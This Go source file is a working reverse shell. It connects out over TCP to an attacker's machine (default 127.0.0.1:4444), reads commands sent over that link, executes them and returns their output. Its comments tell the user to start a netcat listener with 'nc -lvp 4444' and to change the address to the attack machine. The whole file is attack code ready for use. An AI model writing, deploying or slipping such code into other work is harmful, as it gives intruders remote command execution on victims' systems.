package main

// Import dependencies
import (
	"bufio"
	"flag"
	"fmt"
	"log"
	"net"
	"os"
	"os/exec"
	"strconv"
	"strings"
)

// main Main entry point to reverse shell
func main() {

	// variable to hold target ip address passed as argument
	var targetIP string
	var targetPort int

	//capture arguments passed at command line, if none defaults will be used 127.0.0.1:4444
	flag.StringVar(&targetIP, "targetIP", "127.0.0.1", "Target IP")
	flag.IntVar(&targetPort, "targetPort", 4444, "Target Port")
	flag.Parse()

	// check target ip address is valid IPv4
	var target net.IP
	if target = net.ParseIP(targetIP); target == nil {
		log.Printf("non-ip target: %q", targetIP)
		os.Exit(3)
	} else if target = target.To4(); target == nil {
		log.Printf("non-ipv4 target: %q", targetIP)
		os.Exit(3)
	}

	// Dial a connection back to attacker machine on port 4444
	// On your Linux attack box with netcat setup the listener: nc -lvp 4444

	// CHANGE IP ADDRESS:PORT TO ATTACK MACHINE
	netConn, _ := net.Dial("tcp", targetIP+":"+strconv.Itoa(targetPort))

	for {

		// listen for commands coming from the connection to our target
		attackerCommand, _ := bufio.NewReader(netConn).ReadString('\n')

		// execute the command that is sent from the attacker and return the output from it
		commandOutput, err := exec.Command(strings.TrimSuffix(attackerCommand, "\n")).Output()

		if err != nil {
			// if an error happens send it back to attacker
			fmt.Fprintf(netConn, "%s\n", err)
		}
		// return output from command execution back to attacker
		fmt.Fprintf(netConn, "%s\n", commandOutput)

	}
}
